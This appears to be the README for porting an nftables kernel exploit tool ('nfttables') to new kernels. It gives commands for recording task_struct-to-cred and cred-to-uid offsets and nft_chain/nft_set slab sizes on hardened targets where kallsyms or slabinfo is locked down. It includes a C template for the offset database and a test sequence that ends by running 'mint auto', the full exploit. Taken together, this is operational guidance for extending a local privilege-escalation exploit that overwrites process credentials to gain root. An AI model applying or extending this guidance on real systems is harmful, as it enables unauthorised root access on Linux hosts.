# Adding kernel support

## Quick path

Run `nfttables scan -v` on the target. If it resolves everything from kallsyms and slabinfo, you're done. No database entry needed.

## When you need a database entry

The hardcoded database (offsets.c `offset_db[]`) is needed when:
- /proc/kallsyms is locked down (kptr_restrict=2, common on hardened systems)
- /proc/slabinfo is not readable
- The vmlinux boot image is not accessible in /boot

In these cases the tool needs pre-recorded struct offsets and slab cache sizes.

## Gathering offsets

On a system running the target kernel (or a VM with it):

```bash
# 1. Kernel release string (this becomes the glob pattern)
uname -r
# Example: 6.5.0-44-generic

# 2. Distro
cat /etc/os-release | grep PRETTY_NAME

# 3. task_struct -> cred offset
# Method A: pahole (needs kernel debug symbols)
sudo apt install dwarves linux-image-$(uname -r)-dbgsym
pahole -C task_struct /usr/lib/debug/boot/vmlinux-$(uname -r) | grep 'struct cred'

# Method B: crash utility
sudo crash /usr/lib/debug/boot/vmlinux-$(uname -r) /proc/kcore
crash> struct task_struct -o | grep cred

# Method C: check kernel config + source. The offset is stable within
# a distro's kernel config but varies between distros.

# 4. cred -> uid offset (usually 4, rarely changes)
pahole -C cred /usr/lib/debug/boot/vmlinux-$(uname -r) | grep uid

# 5. nft_chain and nft_set object sizes
cat /proc/slabinfo | grep nft_chain
cat /proc/slabinfo | grep nft_set
# If dedicated caches don't exist, the objects land in kmalloc-N.
# Check the kernel source for sizeof(struct nft_chain) and
# sizeof(struct nft_set) to determine which kmalloc bucket.
```

## Adding the entry

Edit `offsets.c`, add to the `offset_db[]` array:

```c
{
    .release_glob   = "6.5.0-4*-generic",   // fnmatch pattern
    .distro         = "Ubuntu 24.04",
    .task_to_cred   = 0x0b48,               // from pahole/crash
    .cred_to_uid    = 4,                     // almost always 4
    .nft_chain_size = 248,                   // from slabinfo obj_size
    .nft_set_size   = 520,
},
```

The release_glob uses fnmatch(3) patterns. Use wildcards for the patch level so one entry covers a range of point releases (e.g. `6.5.0-4*-generic` matches 6.5.0-40 through 6.5.0-49).

## Testing the entry

```bash
# On the target kernel:
./nfttables scan -v

# Verify it picks up your database entry and resolves offsets.
# Then test the vulnerability check:
./nfttables check auto

# If check reports vulnerable, test the full exploit:
./nfttables mint auto
```

## Offset stability

Within a distro's kernel package series, struct offsets are typically stable across point releases. They change when:
- The distro rebases to a new upstream version (e.g. Ubuntu HWE kernels)
- The distro changes CONFIG options that affect struct layout
- The distro backports a patch that adds/removes struct fields

Slab cache sizes can change with any kernel update. The runtime slabinfo lookup handles this. The database values are fallbacks for when slabinfo is not readable.
